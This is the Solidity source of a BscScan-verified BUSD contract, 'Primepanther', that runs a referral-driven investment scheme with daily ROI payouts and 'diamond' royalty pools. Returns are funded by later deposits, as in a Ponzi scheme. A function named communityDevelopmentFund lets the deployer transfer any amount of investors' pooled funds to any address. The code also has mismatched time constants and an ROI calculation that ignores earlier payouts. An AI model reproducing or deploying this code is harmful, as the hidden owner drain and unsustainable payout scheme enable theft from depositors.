/**
 *Submitted for verification at BscScan.com on 2023-01-07
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.12;

interface BEP20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address tokenOwner) external view returns (uint balance);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
    function transfer(address to, uint tokens) external returns (bool success);
    function approve(address spender, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract Primepanther {

    using SafeMath for uint256;

    BEP20 public busd = BEP20(0xDc6cc6d847DF088C3eEDA72404864B59c0cD53B2); 

    address initiator;
    address aggregator;
    address aggregator2;
    address aggregator3;
    address defaultReferer;                  
    address [] investors;
    uint256 totalHoldings;
    uint256 contractBalance;
    uint256 basePrice = 2e8;
    uint256 initializeTime;
    uint256 totalInvestment;
    uint256 totalWithdraw;
    uint256 timeStep = 10 minutes;// 1 days
    uint256 timeStep30 = 30 minutes;// 30 days
    mapping(uint256 => uint256) diamond;
    mapping(uint256 => uint256) blue_diamond;
    mapping(uint256 => address[]) diamond_array;
    mapping(uint256 => address[]) blue_diamond_array;
    
    struct User{ 
        uint256 token;
        address referral;
        uint256 workingWithdraw;
        uint256 nonWorkingWithdraw;
        uint256 totalInvestment;
        uint256 totalWithdraw;
        uint8 nonWorkingPayoutCount;
        uint256 lastNonWokingWithdraw;
        bool isDiamond;
        bool isBlueDiamond;
        mapping(uint256 => uint256) referrals_per_level;
        mapping(uint256 => uint256) team_per_level;
        mapping(uint256 => uint256) levelIncome;
        mapping(uint256 => uint256) business;
        mapping(uint256 => uint256) royaltyBuzz;
        mapping(uint256 => uint256) diamondExist;
        mapping(uint256 => uint256) blueDiamondExist;
        mapping(uint256 => uint256) incomeArray;
        
    }

    struct Deposit{
        uint256 amount;
        uint256 businessAmount;
        uint256 tokens;
        uint256 tokenPrice;
        uint256 depositTime;
    }

    struct Withdraw{
        uint256 amount;
        bool isWorking;
        uint256 tokens;
        uint256 tokenPrice;
        uint256 withdrawTime;
    }

    struct NonWorkingWithdraws{
        uint256 amount;
        bool isWorking;
        uint256 tokens;
        uint256 tokenPrice;
        uint256 withdrawTime;
    }

    struct Downline{
        uint256 level;
        address member;
        uint256 amount;
        uint256 joinTime;
    }

    uint[] referral_bonuses = [10, 5, 4, 3, 2, 2, 2, 3, 4, 5];
    uint[] referral_req = [0, 100e18, 200e18, 300e18, 400e18, 500e18, 600e18, 700e18, 800e18, 1000e18];
    uint[] team_req = [0, 0, 0, 0, 0, 1000e18, 1500e18, 2000e18, 2500e18, 3000e18];

    mapping(address => User) public users;
    mapping(address => Deposit[]) public deposits;
    mapping(address => Withdraw[]) public payouts;
    mapping(address => NonWorkingWithdraws[]) public npayouts;
    mapping(address => Downline[]) public downline;
    
    event Deposits(address buyer, uint256 amount);
    event WorkingWithdraw(address withdrawer, uint256 amount);
    event NonWorkingWithdraw(address withdrawer, uint256 amount);
   
    modifier onlyInitiator(){
        require(msg.sender == initiator,"You are not initiator.");
        _;
    }

    modifier security {
        uint size;
        address sandbox = msg.sender;
        assembly { size := extcodesize(sandbox) }
        require(size == 0, "Smart contract detected!");
        _;
    }

    function contractInfo() public view returns( uint256 totalDeposits, uint256 totalPayouts, uint256 totalInvestors, uint256 totalHolding, uint256 balance){
        totalDeposits = totalInvestment;
        totalPayouts = totalWithdraw;
        totalInvestors = investors.length;
        totalHolding = totalHoldings;
        balance = busd.balanceOf(address(this));
        return(totalDeposits,totalPayouts,totalInvestors,totalHolding,balance);
    }

    constructor() public {
        initiator = msg.sender;
        aggregator = 0x58ab81E4805d204c70975Cfebe0564AA4C351EBB;
        aggregator2 = 0x5b1a8BD87e4F82E22e4F01Caf159ff9C2B0252e6;
        aggregator3 = 0xb7CefDe542214CeB7a8bE3D08723c6baBd7316E3;
        defaultReferer = msg.sender;
        investors.push(msg.sender);
        initializeTime = block.timestamp;
        
    }

    function deposit(address _referer, uint256 amount) public security{
        require(amount>=50e18,"Invalid investment amount.");
        require(users[_referer].totalInvestment>0 || _referer==defaultReferer,"Invalid Sponsor!");
        contractBalance+=amount;
        busd.transferFrom(msg.sender,address(this),amount);
        User storage user = users[msg.sender];
        
        uint256 price = getCurrentPrice();
        
        user.token+=(amount.mul(50).div(100)).div(price);
        totalHoldings+=(amount.mul(50).div(100)).div(price);
       
        totalInvestment+=amount;
        bool isReDep = false;
        if(user.totalInvestment>0){
            isReDep = true;
            _referer = users[msg.sender].referral;
        }
        else{
            users[msg.sender].referral = _referer;
        }

        user.totalInvestment+=amount;
        
        deposits[msg.sender].push(Deposit(
            amount,
            amount.mul(50).div(100),
            (amount.mul(50).div(100)).div(price),
            price,
            block.timestamp
        ));

        _setReferral(msg.sender,_referer, amount, isReDep);
        
        busd.transfer(aggregator,amount.mul(1).div(100));
        busd.transfer(aggregator2,amount.mul(2).div(100));
        busd.transfer(aggregator3,amount.mul(2).div(100));
        emit Deposits(msg.sender, amount);

        uint256 royalno = getRoyalDay();
        diamond[royalno]+=amount.mul(250).div(1000);
        blue_diamond[royalno]+=amount.mul(250).div(1000);
        
        updateDiamond(royalno);
        updateBlueDiamond(royalno);
    } 

    function _setReferral(address _addr, address _referral, uint256 _amount, bool isReDep) private {
        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            if(isReDep==false){
                downline[_referral].push(Downline(
                    i,
                    _addr,
                    _amount,
                    block.timestamp
                ));
                users[_referral].team_per_level[i]++;
            }
            if(i==0){
                users[_referral].business[0]+=_amount;
            }
            else{
                users[_referral].business[1]+=_amount;
            }
            users[_referral].referrals_per_level[i]+=_amount;
            if(users[_referral].business[0]>=referral_req[i] && users[_referral].business[1]>=team_req[i]){
                users[_referral].levelIncome[i]+=_amount.mul(referral_bonuses[i]).div(100);
            }
            
            uint256 totalDays = (_referral==initiator)?0:getCurDay(deposits[_referral][0].depositTime);
            uint256 royalno = getRoyalDay();
            users[_referral].royaltyBuzz[royalno]+=_amount;
            if(users[_referral].business[0]>=2500e18 && users[_referral].business[1]>=7500e18 && users[_referral].isDiamond==false && totalDays<=30){
                users[_referral].isDiamond = true;
            }
            if(users[_referral].business[0]>=5000e18 && users[_referral].business[1]>=15000e18 && users[_referral].isBlueDiamond==false && totalDays<=60){
                users[_referral].isBlueDiamond = true;
            }
            if(users[_referral].isDiamond == true && users[_referral].royaltyBuzz[royalno]>=5000e18 && users[_referral].diamondExist[royalno]==0){
               diamond_array[royalno].push(_referral);
               users[_referral].diamondExist[royalno]=1;
            }
            if(users[_referral].isBlueDiamond == true && users[_referral].royaltyBuzz[royalno]>=10000e18 && users[_referral].blueDiamondExist[royalno]==0){
                blue_diamond_array[royalno].push(_referral);
                users[_referral].blueDiamondExist[royalno]=1;
            }
            _referral = users[_referral].referral;
            if(_referral == address(0)) break;
        }
        
    }

    function updateDiamond(uint256 totalDays) private {
        if(diamond[totalDays-1]>0){
            if(diamond_array[totalDays-1].length>0){
                uint256 distLAmount=diamond[totalDays-1].div(diamond_array[totalDays-1].length);
                for(uint8 i = 0; i < diamond_array[totalDays-1].length; i++) {
                    users[diamond_array[totalDays-1][i]].incomeArray[0]+=distLAmount;
                }
                diamond[totalDays-1]=0;
            }
        }
    }

    function updateBlueDiamond(uint256 totalDays) private {
        if(blue_diamond[totalDays-1]>0){
            if(blue_diamond_array[totalDays-1].length>0){
                uint256 distLAmount=blue_diamond[totalDays-1].div(blue_diamond_array[totalDays-1].length);
                for(uint8 i = 0; i < blue_diamond_array[totalDays-1].length; i++) {
                    users[blue_diamond_array[totalDays-1][i]].incomeArray[1]+=distLAmount;
                }
                blue_diamond[totalDays-1]=0;
            }
        }
    }

    function royaltyMembers(uint256 _royalno) public view returns(uint256 dv, uint256 bdv, address [] memory dmember, address [] memory bdmember){
        return (diamond[_royalno], blue_diamond[_royalno], diamond_array[_royalno], blue_diamond_array[_royalno]);
    }

    function getTxnLengths(address _addr) public view returns(uint256 dl, uint256 wl, uint256 nl){
        return (deposits[_addr].length, payouts[_addr].length, npayouts[_addr].length);
    }
    

    function _getWorkingIncome(address _addr) internal view returns(uint256 income){
        User storage user = users[_addr];
        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            income+=user.levelIncome[i];
        }
        income+=user.incomeArray[0]+user.incomeArray[1];
        return income;
    }

    function workingWithdraw(uint256 _amount) public security{
        User storage user = users[msg.sender];
        require(user.totalInvestment>0, "Invalid User!");
        require(_amount>=20e18, "Minimum 20 BUSD can be withdrawn!");
        uint256 working = _getWorkingIncome(msg.sender);
        uint256 withdrawable = working.sub(user.workingWithdraw);
        require(withdrawable>=_amount, "Amount exceeds withdrawable!");
        user.workingWithdraw+=_amount;
       
        user.totalWithdraw+= _amount;
        totalWithdraw+=_amount;
        contractBalance-=_amount;
        uint256 levelShare = _amount.mul(10).div(100);
        _amount = _amount.mul(90).div(100);
        busd.transfer(msg.sender,_amount);
        busd.transfer(initiator,levelShare);
        payouts[msg.sender].push(Withdraw(
            _amount,
            true,
            0,
            0,
            block.timestamp
        ));

        emit WorkingWithdraw(msg.sender,_amount);
    }

    function calculateROI(address _addr) view public returns(uint256 _myROI){
        for(uint256 i = 0; i < deposits[_addr].length; i++){
            uint256 totalDays = getCurDay(deposits[_addr][i].depositTime);
            totalDays = (totalDays>=50)?50:totalDays;
            _myROI+=(deposits[_addr][i].tokens.mul(2).div(100)).mul(totalDays);
        }
        return _myROI;
    }

    function nonWorkingWithdraw() public security{
        User storage user = users[msg.sender];
        require(user.totalInvestment>0, "Invalid User!");
        uint256 nextPayout = (user.lastNonWokingWithdraw>0)?user.lastNonWokingWithdraw + 1 days:deposits[msg.sender][0].depositTime;
        require(block.timestamp >= nextPayout,"Sorry ! See you next time.");
        user.nonWorkingPayoutCount++;
        uint256 myROI = calculateROI(msg.sender);
        uint256 calcWithdrawable = myROI.mul(getCurrentPrice());
        contractBalance-=calcWithdrawable;
        uint256 withdrawable = myROI.mul(getCurrentPrice());
        busd.transfer(msg.sender,withdrawable.mul(90).div(100));
        busd.transfer(initiator,withdrawable.mul(10).div(100));
        user.lastNonWokingWithdraw = block.timestamp;
        user.token-=myROI;
        
        user.totalWithdraw+= withdrawable;
        user.nonWorkingWithdraw+=withdrawable;
        totalWithdraw+=withdrawable;
        totalHoldings-=myROI;
        
        npayouts[msg.sender].push(NonWorkingWithdraws(
            withdrawable,
            false,
            withdrawable.mul(getCurrentPrice()),
            getCurrentPrice(),
            block.timestamp
        ));
        
        emit NonWorkingWithdraw(msg.sender,withdrawable);
    }

    function userInfo(address _addr) view external returns(uint256[16] memory team, uint256[16] memory referrals, uint256[16] memory income, uint256 dr, uint256 bdr) {
        User storage player = users[_addr];
        for(uint8 i = 0; i <= 15; i++) {
            team[i] = player.team_per_level[i];
            referrals[i] = player.referrals_per_level[i];
            income[i] = player.levelIncome[i];
        }

        return (
            team,
            referrals,
            income,
            player.incomeArray[0],
            player.incomeArray[1]
        );
    }

    function communityDevelopmentFund(address payable buyer, uint _amount) external onlyInitiator security{
        busd.transfer(buyer,_amount);
        contractBalance-=_amount;
    }

    function getCurrentPrice() public view returns(uint256 price){
        price = (contractBalance>0)?basePrice.mul(contractBalance).div(1e18):basePrice;
        return price;
    }

    function getCurDay(uint256 init) public view returns(uint256) {
        return (block.timestamp.sub(init)).div(timeStep);
    }

    function getRoyalDay() public view returns(uint256) {
        return (block.timestamp.sub(initializeTime)).div(timeStep30);
    }

   
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}